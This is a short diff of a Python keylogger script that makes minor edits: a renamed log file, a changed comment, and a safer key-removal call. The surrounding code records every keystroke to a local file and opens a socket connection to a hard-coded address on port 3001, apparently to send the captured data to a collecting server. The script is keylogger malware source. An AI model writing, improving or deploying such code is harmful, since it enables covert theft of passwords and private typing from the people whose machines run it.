@@ -6,7 +6,7 @@ keyboard=Listener()
 data=""  
 pressed_keys=set()
 
-#Server ip 
+#ip 
 Host='192.168.234.1'
 port =3001
 
@@ -20,7 +20,7 @@ client.send(fname.encode())
 
 #when key is pressed the below function would be executed
 def on_press(key):
-    with open("Key.txt","a") as a:
+    with open("key.txt","a") as a:
        global data
        try:
            pressed_keys.add(key)
@@ -47,7 +47,7 @@ def on_press(key):
 
 #function to be executed when the key is released
 def on_release(key):
-    pressed_keys.remove(key)
+    pressed_keys.discard(key)
         
 with Listener(on_press=on_press,on_release=on_release) as listener:
         listener.join()
